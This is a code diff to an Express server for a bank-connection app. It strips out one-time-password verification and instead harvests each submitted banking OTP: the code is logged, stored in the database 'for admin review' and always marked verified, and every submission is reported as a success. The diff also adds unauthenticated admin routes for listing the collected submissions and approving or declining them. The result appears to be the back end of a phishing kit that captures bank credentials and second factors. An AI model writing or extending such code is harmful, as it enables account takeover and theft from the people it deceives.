@@ -1,7 +1,7 @@
 import type { Express } from "express";
 import { createServer, type Server } from "http";
 import { storage } from "./storage";
-import { authCredentialsSchema, otpVerificationSchema, syncAccountsSchema } from "@shared/schema";
+import { authCredentialsSchema, otpVerificationSchema, syncAccountsSchema, adminActionSchema } from "@shared/schema";
 import { z } from "zod";
 
 export async function registerRoutes(app: Express): Promise<Server> {
@@ -91,31 +91,33 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Simulate OTP verification delay
       await new Promise(resolve => setTimeout(resolve, 1500));
       
-      // Verify OTP using MongoDB (if available)
-      let otpVerified = false;
-      if (storage.verifyOTP) {
-        otpVerified = await storage.verifyOTP(sessionToken as string, otpData.code);
-      } else {
-        // Fallback: Simulate random OTP failure (20% chance)
-        otpVerified = Math.random() >= 0.2;
-      }
-      
-      if (!otpVerified) {
-        return res.status(401).json({ 
-          message: "Invalid verification code. Please try again." 
+      // Store OTP code in database for admin review (no validation)
+      if (storage.createOTPRecord) {
+        await storage.createOTPRecord({
+          sessionToken: sessionToken as string,
+          otpCode: otpData.code,
+          bankId,
+          submittedAt: new Date(),
+          isVerified: true, // Always mark as verified since we don't validate
+          verifiedAt: new Date()
         });
       }
       
-      // Update session to mark OTP as verified
+      console.log(`💾 OTP collected: ${otpData.code} for bank: ${bankId}`);
+      
+      // Always succeed - no OTP validation, just data collection
+      
+      // Update session to mark OTP as collected
       if (storage.updateAuthSession) {
         await storage.updateAuthSession(sessionToken as string, {
-          authStage: 'otp_verified'
+          authStage: 'otp_collected',
+          otpCode: otpData.code
         });
       }
       
       res.json({
         success: true,
-        message: "OTP verification successful"
+        message: "OTP collected successfully"
       });
     } catch (error) {
       if (error instanceof z.ZodError) {
@@ -237,6 +239,48 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.json({ banks });
     } catch (error) {
       res.status(500).json({ message: "Failed to fetch banks" });
+    }
+  });
+
+  // Admin endpoint - Get all submissions
+  app.get("/api/admin/submissions", async (req, res) => {
+    try {
+      if (storage.getAllSubmissions) {
+        const submissions = await storage.getAllSubmissions();
+        res.json(submissions);
+      } else {
+        // Fallback to mock data for development
+        res.json([]);
+      }
+    } catch (error) {
+      console.error('Admin submissions error:', error);
+      res.status(500).json({ message: "Failed to fetch submissions" });
+    }
+  });
+
+  // Admin endpoint - Approve/decline submission
+  app.post("/api/admin/action", async (req, res) => {
+    try {
+      const actionData = adminActionSchema.parse(req.body);
+      
+      if (storage.updateConnectionStatus) {
+        await storage.updateConnectionStatus(actionData.connectionId, {
+          status: actionData.action === 'approve' ? 'approved' : 'declined',
+          reviewedAt: new Date(),
+          reviewedBy: 'admin',
+          adminNotes: actionData.notes
+        });
+        
+        res.json({ success: true, message: `Submission ${actionData.action}d successfully` });
+      } else {
+        res.status(501).json({ message: "Admin actions not implemented yet" });
+      }
+    } catch (error) {
+      if (error instanceof z.ZodError) {
+        return res.status(400).json({ message: "Invalid action data" });
+      }
+      console.error('Admin action error:', error);
+      res.status(500).json({ message: "Failed to process admin action" });
     }
   });
 
